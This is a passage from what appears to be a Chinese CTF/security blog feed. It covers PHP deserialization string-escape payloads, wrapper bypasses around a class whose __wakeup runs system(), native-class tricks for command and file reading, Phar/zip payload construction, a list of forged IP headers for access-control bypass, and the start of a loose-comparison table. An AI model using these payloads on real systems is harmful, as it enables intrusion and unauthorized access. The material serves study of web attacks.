class="line"></span><br><span class="line">输出</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">81</span>:<span class="string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;shell2&quot;</span>;&#125;<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s:163:&quot;</span>O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">81</span>:<span class="string">&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;shell2&quot;</span>;&#125;<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">shell2</span><br></pre></td></tr></table></figure><p><code>str_replace</code>函数将 $str中的 ‘bb’ 替换成 ‘ccc’，比原来多了一个字符</p><p>O:1:”C”:2:{s:4:”name”;s:4:”<code>在name的属性里写我们想要输入的</code><em>“;s:4:”pass”;s:6:”123456”;}</em><code>后面的pass需要注释掉</code></p><blockquote><p>写在 $name 里的字符串长度 &#x3D;&#x3D; 替换后的字符串长度</p></blockquote><p><strong>str_replace前</strong></p><p>O:1:”C”:2:{s:4:”name”;s:81:”<code>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;shell2&quot;;&#125;</code>“;s:4:”pass”;s:6:”123456”;}</p><ul><li>有色字体是 $name值 一共<code>81字符</code></li><li>要用<code>&quot;</code>闭合替换后的字符串</li><li><code>s:81</code>表示长度为81，字符串中间有<code>&quot;</code>也会被当成字符串中的一个字符</li><li>最后也要闭合整个序列化值 注释原本的 $pass</li></ul><p><strong>str_replace后</strong></p><p>s:163:”O:1:”C”:2:{s:4:”name”;s:81:”<code>ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc</code>“;s:4:”pass”;s:6:”shell2”;}”;s:4:”pass”;s:6:”123456”;}”;</p><ul><li><code>s:163</code>是作为字符串 $res的长度</li><li>有色字体是经过 str_replace 替换的数据 一共<code>81字符</code></li><li>后面的<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;shell2&quot;;&#125;</code>便会逃逸，和前面凑成了一个完整的序列化值</li><li><code>&#125;</code>后的<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;;</code>就被注释了</li></ul><p>通过<code>unserialize </code>$pass 的值就被修改为 “shell2”</p><h3 id="减少逃逸"><a href="#减少逃逸" class="headerlink" title="减少逃逸"></a>减少逃逸</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cccccccccccccccccccccccccccccccccccccccccccccccccccccc&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;;s:4:&quot;qwer&quot;;s:5:&quot;shell&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;ccc&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;qwer;</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">54</span>:<span class="string">&quot;cccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;;s:4:&quot;</span>qwer<span class="string">&quot;;s:5:&quot;</span>shell<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s:108:&quot;</span>O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">54</span>:<span class="string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;;s:4:&quot;</span>qwer<span class="string">&quot;;s:5:&quot;</span>shell<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure><p><code>str_replace</code>函数将 $str中的 ‘ccc’ 替换成 ‘bb’，比原来少了一个字符</p><blockquote><p>写在 $name 里的字符串的长度 &#x3D;&#x3D; 替换后的$name字符串 + $pass中不需要字符串 的长度</p></blockquote><p><strong>str_replace前</strong></p><p>O:1:”C”:2:{s:4:”name”;s:54:”cccccccccccccccccccccccccccccccccccccccccccccccccccccc<code>&quot;;s:4:&quot;pass&quot;;s:22:&quot;;s:4:&quot;qwer&quot;;s:5:&quot;shell</code>“;}</p><ul><li>有色字体是 $pass值</li><li>$pass值中<code>&quot;;s:4:&quot;pass&quot;;s:22:</code>“;s:4:”qwer”;s:5:”shell，此行有色字体是需要通过str_replace包含进 $name，后面的<code>&quot;;</code>进行闭合</li><li>$pass值最后加上<code>&quot;;&#125;</code>也可以 -&gt; $pass&#x3D;’;s:4:”qwer”;s:5:”shell”;}，视实际情况而定</li></ul><p><strong>str_replace后</strong></p><p>s:108:”O:1:”C”:2:{s:4:”name”;s:54:”<code>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:22:</code>“;s:4:”qwer”;s:5:”shell”;}”;</p><ul><li>s:108  是作为字符串 $res的长度</li><li>有色字体是包含 str_replace后 $name的值</li><li>后面的 <code>s:4:&quot;qwer&quot;;s:5:&quot;shell&quot;;</code>就形成了新的成员和属性</li></ul><p>通过<code>unserialize </code>就会新增成员 $qwer 值为 “shell”</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>过滤 Object、Array…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// a:1:&#123;i:0;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$array</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">c</span>()];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;a:1:&#123;i:0;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:16:&quot;SplObjectStorage&quot;:54:&#123;x:i:1;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;,N;;m:a:0:&#123;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">SplObjectStorage</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">attach</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:8:&quot;SplStack&quot;:41:&#123;i:6;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">push</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:8:&quot;SplQueue&quot;:41:&#123;i:4;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">SplQueue</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">enqueue</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:19:&quot;SplDoublyLinkedList&quot;:41:&#123;i:0;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">SplDoublyLinkedList</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">push</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br></pre></td></tr></table></figure><h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h2><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>ReflectionClass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;类&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>Exception\Error</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h3><p>FilesystemIterator\DirectoryIterator\GlobIterator</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span> 和 <span class="built_in">DirectoryIterator</span> 用法</span><br><span class="line"><span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不需要glob协议头</span></span><br><span class="line"><span class="built_in">GlobIterator</span>(<span class="string">&quot;f*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&#x27;</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>SplFileObject</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SplFileObject</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar:&#x2F;&#x2F;"></a>Phar:&#x2F;&#x2F;</h2><p>Php通过 <code>__HALT_COMPILER</code> 来识别Phar文件</p><p>生成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>Bypass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">$phar-&gt;setStub(“GIF89a”.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure><p>zip</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar_file</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phar_file</span>;</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;crispr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$phar_file</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP Spoofing</title>
      <link href="/2023/06/25/others/IP%20Spoofing/"/>
      <url>/2023/06/25/others/IP%20Spoofing/</url>
      
        <content type="html"><![CDATA[<h1 id="IP-Spoofing"><a href="#IP-Spoofing" class="headerlink" title="IP Spoofing"></a>IP Spoofing</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Client-IP:127.0.0.1</span><br><span class="line">Forwarded-For-Ip: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">Forwarded-For: localhost</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">Forwarded: localhost</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br><span class="line">X-Custom-IP-Authorization : 127.0.0.1</span><br><span class="line">X-Forward-For: 127.0.0.1</span><br><span class="line">X-Forward: 127.0.0.1</span><br><span class="line">X-Forward: localhost</span><br><span class="line">X-Forwarded-By:127.0.0.1</span><br><span class="line">X-Forwarded-By: localhost</span><br><span class="line">X-Forwarded-For-Original: 127.0.0.1</span><br><span class="line">X-Forwarded-For-original: localhost</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded-For: localhost</span><br><span class="line">X-Forwarded-Server: 127.0.0.1</span><br><span class="line">X-Forwarded-Server: localhost</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">X-Forwarded: localhost</span><br><span class="line">X-Forwared-Host: 127.0.0.1</span><br><span class="line">X-Forwared-Host: localhost</span><br><span class="line">X-Host: 127.0.0.1</span><br><span class="line">X-Host: localhost</span><br><span class="line">X-HTTP-Host-Override : 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-Remote-Addr : localhost</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Php Hash Compare</title>
      <link href="/2023/06/20/php/Hash%20Compare/"/>
      <url>/2023/06/20/php/Hash%20Compare/</url>
      
        <content type="html"><![CDATA[<h1 id="Php-Hash-Compare"><a href="#Php-Hash-Compare" class="headerlink" title="Php Hash Compare"></a>Php Hash Compare</h1><p><strong>散列算法（Hash Algorithm）</strong>，是一种从任意文件中创造小的数字「指纹」的方法。常见 Hash 算法有 MD5 和 SHA 系列：MD5 和 SHA1 ，SHA2-256 算法。</p><h2 id="Php-特性"><a href="#Php-特性" class="headerlink" title="Php 特性"></a>Php 特性</h2><h3 id="Php字符串比较"><a href="#Php字符串比较" class="headerlink" title="Php字符串比较"></a>Php字符串比较</h3><p>字符串 与 字符串：判断值是否相等。</p><p>字符串 与 数值：判断字符串第一个字母前的数字是否与比较的数值相等。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;123a&quot;</span>==<span class="number">123</span>)   <span class="comment">//bool(ture)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;123a&quot;</span>==<span class="string">&quot;123&quot;</span>) <span class="comment">//bool(false) </span></span><br></pre></td></tr></table></figure><h3 id="松散比较"><a href="#松散比较" class="headerlink" title="松散比较 (&#x3D;&#x3D;)"></a>松散比较 (&#x3D;&#x3D;)</h3><table><thead><tr><th align="left">松散</th><th align="left"><strong><code>TRUE</code></strong></th><th align="left"><strong><code>FALSE</code></strong></th><th align="left"><em>1</em></th><th align="left"><em>0</em></th><th align="left"><em>-1</em></th><th align="left"><em>“1”</em></th><th align="left"><em>“0”</em></th><th align="left"><em>“-1”</em></th><th align="left"><strong><code>NULL</code></strong></th><th align="left"><em>array()</em></th><th align="left"><em>“php”</em></th><th align="left"><em>“”</em></th></tr></thead><tbody><tr><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><em>1</em></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>0</em></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><em>-1</em></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><em>“1”</em></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td 